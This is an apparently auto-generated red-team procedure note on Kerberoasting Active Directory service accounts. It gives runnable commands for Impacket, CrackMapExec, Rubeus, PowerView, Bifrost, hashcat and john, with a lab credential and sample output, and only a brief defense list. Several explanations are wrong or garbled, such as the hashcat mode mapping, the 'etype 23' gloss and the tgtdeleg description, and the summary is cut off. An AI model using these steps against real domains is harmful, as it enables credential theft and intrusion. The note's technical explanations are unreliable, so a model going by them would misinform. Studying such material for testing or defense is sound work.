---
id: 2a939216-e955-49da-a5f3-e9d0621be522
name: Kerberoasting with Rubeus
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:04.942573+00:00'
updated_at: '2023-04-10T20:26:35.021276+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Kerberoasting|T1208 - Kerberoasting]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Kerberoasting]]'
commands:
- '[[Ask TGS with Kerberoasting enabled]]'
- '[[crackmapexec ldap]]'
- '[[Get User SPNs]]'
- '[[List all etype 23]]'
- '[[Request SPN Ticket for MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local]]'
- '[[Rubeus.exe kerberoast /stats]]'
---

# Kerberoasting with Rubeus

## Summary

Kerberoasting is a technique used to extract service account credentials from Active Directory by exploiting the way that Kerberos implements authentication for services. The attacker requests a Kerberos ticket-granting service (TGS) ticket for a service account with a vulnerable Kerberos encryptio

## Description

# Description

Kerberoasting is a technique used to extract service account credentials from Active Directory by exploiting the way that Kerberos implements authentication for services. The attacker requests a Kerberos ticket-granting service (TGS) ticket for a service account with a vulnerable Kerberos encryption type, which can then be cracked offline to reveal the account's plaintext password. This procedure specifically utilizes the Rubeus tool to perform the Kerberoasting attack. This technique can be used to gain access to sensitive information and systems within an organization.

## Requirements

1. Valid domain credentials

1. Access to a domain-joined Windows machine

1. Rubeus tool

## Defense

1. Ensure that all service accounts have strong, unique passwords

1. Monitor for and restrict the use of vulnerable Kerberos encryption types

1. Implement network segmentation to limit lateral movement within the network

## Objectives

1. Extract service account credentials from Active Directory

1. Gain access to sensitive information and systems within an organization

# Instructions

1. Use the GetUserSPNs command from Impacket Suite to retrieve a list of Service Principal Names (SPNs) for a specified user account. This command requires the target user's username and password hash along with the domain controller's IP address. The output will include the SPNs, the user account's name, the groups the user is a member of, the password last set date, and the last logon date.

**Code**: [[$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandi]]

> The GetUserSPNs command is used to retrieve a list of Service Principal Names (SPNs) for a specified user account. The SPNs are used to uniquely identify a service instance in a network. This command requires the target user's username and password hash along with the domain controller's IP address. The output will include the SPNs, the user account's name, the groups the user is a member of, the password last set date, and the last logon date. This information can be used to identify potential targets for further exploitation.

**Command** ([[Get User SPNs]]):

```bash
$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 

```

2. Use the CrackMapExec module to enumerate LDAP and perform Kerberoasting on the target host

**Code**: [[$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'pa]]

> This command uses the CrackMapExec module to enumerate LDAP on the target host with IP address 10.0.2.11. The '-u' and '-p' options are used to provide the username and password for authentication. The '--kdcHost' option is used to specify the domain controller host for Kerberos requests. The '--kerberoast' option is used to output the Kerberoast hashes to a file named 'output.txt'. The output of the command includes information about the target host, such as its operating system and domain, as well as the Kerberoast hash for the specified user. This information can be used for further enumeration and exploitation of the target.

**Command** ([[crackmapexec ldap]]):

```bash
$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
```

3. To kerberoast with Rubeus, use the following commands:

1. To get statistics on supported encryption types and password last set year, run:

   Rubeus.exe kerberoast /stats

2. To kerberoast with an RC4 ticket, run:

   Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt

3. To kerberoast with an AES ticket, run:

   Rubeus.exe kerberoast /tgtdeleg

   Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.

4. To kerberoast with an RC4 ticket using the tgtdeleg trick, and enumerate and roast accounts without AES enabled, run:

   Rubeus.exe kerberoast /rc4opsec

**Code**: [[# Stats
Rubeus.exe kerberoast /stats
-------------]]

> The above commands use Rubeus, a tool for attacking Kerberos. Kerberoasting is a technique used to extract Kerberos tickets from domain users without needing their password. The /stats command provides statistics on supported encryption types and password last set year. The /creduser and /credpassword arguments are used to specify the username and password to use for Kerberoasting with an RC4 ticket. The /tgtdeleg argument is used to request an AES ticket using the tgtdeleg trick. The /rc4opsec argument is used to request an RC4 ticket using the tgtdeleg trick, and to enumerate and roast accounts without AES enabled.

**Command** ([[Rubeus.exe kerberoast /stats]]):

```bash
-------------------------------------   ----------------------------------
| Supported Encryption Type | Count |  | Password Last Set Year | Count |
-------------------------------------  ----------------------------------
| RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |
-------------------------------------  ----------------------------------

```

4. Use this command to request a Service Principal Name (SPN) ticket for the specified SPN.

**Code**: [[Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollar]]

> - **-SPN** : Specifies the Service Principal Name (SPN) for which to request the ticket.
- This command is helpful in performing Kerberos attacks and privilege escalation.
- This command requires administrative privileges on the target system.
- For more information, refer to the PowerView documentation.

**Command** ([[Request SPN Ticket for MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local]]):

```bash
Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

5. This command uses Bifrost to ask for a TGS ticket for the specified service using the provided ticket and kerberoasting. The `-ticket` argument should contain the ticket obtained through previous steps. The `-service` argument should contain the name of the service you want to request a TGS ticket for. The `-kerberoast` argument should be set to `true` if you want to kerberoast the request.

**Code**: [[./bifrost -action asktgs -ticket doIF<...snip...>Q]]

> - `./bifrost`: The path to the Bifrost executable.
- `-action asktgs`: The action to perform using Bifrost.
- `-ticket`: The ticket obtained through previous steps.
- `-service`: The name of the service you want to request a TGS ticket for.
- `-kerberoast`: A flag that enables kerberoasting.

**Command** ([[Ask TGS with Kerberoasting enabled]]):

```bash
./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
```

6. Use this tool to perform a targeted Kerberoast attack on a specified domain. This tool will attempt to set a servicePrincipalName for each user without one, allowing for the collection of Kerberos tickets. The tool will then print the "kerberoast" hash and delete the temporary SPN set for that operation. Use the available command line arguments to specify the target domain, users file, output file, and other options.

**Code**: [[# for each user without SPNs, it tries to set one ]]

> The targeted Kerberoast attack is a technique used to extract Kerberos tickets from users without requiring their password. The attack takes advantage of the fact that service accounts often have a servicePrincipalName set, while regular user accounts do not. By setting a temporary servicePrincipalName for a user account, the attacker can request a Kerberos ticket for that account, which can then be used to crack the hash and obtain the user's password. This tool automates the process of setting the temporary SPN and requesting the ticket for each user without one.

7. To crack the Kerberos TGS ticket, use hashcat with the appropriate mode. The mode to use depends on the encryption type used in the ticket. For example, if the encryption type is AES-128-CTS-HMAC-SHA1-96, use hashcat mode 13100.

**Code**: [[$krb5tgs$23]]

> The Kerberos TGS ticket contains a session key encrypted with the server's secret key. To crack the ticket, the session key needs to be decrypted. Hashcat is a popular password cracking tool that supports various encryption types. By using the appropriate mode in hashcat, the session key can be decrypted, which can then be used to gain access to the target system.

8. etype <type_number>

**Code**: [[etype 23]]

> The etype command is used to extract data of a specific type from a file. In this case, the <type_number> argument is set to 23 to extract data of type 23. The extracted data will be returned as output.

**Command** ([[List all etype 23]]):

```bash
etype 23
```

9. To crack Kerberos hashes using hashcat and john, follow the below instructions:

1. Download the kerberos_hashes.txt file containing the hashes that you want to crack.
2. Download the crackstation.txt file containing a list of common passwords.
3. Run the below command using hashcat to start the cracking process:

./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt

4. Once the cracking process completes, run the below command using john to get the cracked passwords:

./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt

Note: Make sure to replace the file paths and parameters as per your requirements.

**Code**: [[./hashcat -m 13100 -a 0 kerberos_hashes.txt cracks]]

> The above command is used to crack Kerberos hashes using hashcat and john. The command uses the following arguments:

1. -m : This argument specifies the hash type. In this case, it is set to 13100 which is the hash type for Kerberos 5 TGS-REP etype 23.
2. -a : This argument specifies the attack mode. In this case, it is set to 0 which is the straight attack mode.
3. kerberos_hashes.txt : This is the file containing the hashes that need to be cracked.
4. crackstation.txt : This is the file containing a list of common passwords that will be used for cracking.
5. --wordlist : This argument specifies the wordlist to be used by john for cracking.
6. --fork : This argument specifies the number of forked processes to use. In this case, it is set to 4.
7. --format : This argument specifies the hash format. In this case, it is set to krb5tgs which is the format used by Kerberos.
8. ~/kerberos_hashes.txt : This is the path to the file containing the hashes that need to be cracked.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Kerberoasting|T1208 - Kerberoasting]]

## Commands Used

- [[Ask TGS with Kerberoasting enabled]]
- [[crackmapexec ldap]]
- [[Get User SPNs]]
- [[List all etype 23]]
- [[Request SPN Ticket for MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local]]
- [[Rubeus.exe kerberoast /stats]]

## Tags

- [[Active Directory Attacks]]
- [[Kerberoasting]]
